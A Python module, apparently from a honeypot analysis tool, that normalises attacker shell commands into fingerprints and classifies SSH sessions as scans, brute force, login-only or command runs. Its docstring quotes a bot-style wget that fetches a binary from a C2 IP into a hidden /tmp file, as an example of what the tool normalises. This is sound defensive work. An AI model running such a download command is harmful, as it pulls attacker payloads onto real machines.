"""Group sessions into attack patterns ("clusters") without an LLM.

Bots run the same script thousands of times, but small details change each time:
the C2 IP, a random filename, a fresh SSH key. We replace those details with
placeholders, so the same script always produces the same fingerprint.

  wget http://45.9.1.2/x86_64 -O /tmp/.k82jf  ->  wget <URL> -O /tmp/<RAND>
"""
from __future__ import annotations

import hashlib
import re

_SUBS = [
    (re.compile(r"ssh-(rsa|ed25519|dss)\s+\S+(\s+\S+)?"), r"ssh-\1 <SSHKEY>"),
    (re.compile(r"\b(?:https?|ftp|tftp)://\S+", re.I), "<URL>"),
    (re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?\b"), "<IP>"),
    (re.compile(r"\b[A-Za-z0-9+/]{24,}={0,2}"), "<B64>"),
    (re.compile(r"\b[0-9a-fA-F]{8,}\b"), "<HEX>"),
    # random-looking names: 6+ chars mixing letters and digits, e.g. .k82jfQ, x7Hq9z
    (re.compile(r"(?<![A-Za-z0-9])\.?(?=[A-Za-z0-9]*\d)(?=[A-Za-z0-9]*[A-Za-z])[A-Za-z0-9]{6,}"), "<RAND>"),
    (re.compile(r"\b\d{3,}\b"), "<N>"),
    (re.compile(r"\s+"), " "),
]


def normalize_command(cmd: str) -> str:
    out = cmd.strip()
    for pattern, repl in _SUBS:
        out = pattern.sub(repl, out)
    return out.strip()


def normalized_commands(commands: list[str]) -> list[str]:
    """Normalize and drop consecutive duplicates (bots often retry the same line)."""
    result: list[str] = []
    for c in commands:
        n = normalize_command(c)
        if n and (not result or result[-1] != n):
            result.append(n)
    return result


def classify_session(session: dict) -> tuple[str, str]:
    """Return (cluster_id, kind).

    kind is one of:
      scan          connected, never tried to log in (port scanners / banner grabbers)
      bruteforce    only failed passwords
      login_only    got in, but typed nothing (bot testing which creds work)
      commands      got in and ran commands  -> this is what we send to the LLM
    """
    commands = [c["input"] for c in session.get("commands", [])]
    if commands:
        norm = normalized_commands(commands)
        digest = hashlib.sha1("\n".join(norm).encode()).hexdigest()[:16]
        return f"cmd-{digest}", "commands"
    if session.get("login_success"):
        return "static-login-only", "login_only"
    if session.get("login_failed"):
        return "static-bruteforce", "bruteforce"
    return "static-scan", "scan"
